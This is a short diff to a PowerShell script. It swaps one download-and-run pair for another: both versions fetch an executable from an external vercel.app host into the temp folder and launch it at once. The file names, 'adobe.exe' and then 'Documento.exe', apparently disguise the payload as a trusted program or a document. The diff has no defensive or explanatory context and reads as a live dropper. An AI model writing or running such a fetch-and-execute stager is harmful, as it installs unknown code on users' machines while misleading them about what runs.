@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "https://testando123-blond.vercel.app/adobe.exe" -OutFile "$env:TEMP\adobe.exe"
-Start-Process "$env:TEMP\adobe.exe"
+Invoke-WebRequest -Uri "https://testando123-blond.vercel.app/Documento001.exe" -OutFile "$env:TEMP\Documento.exe"
+Start-Process "$env:TEMP\Documento.exe"
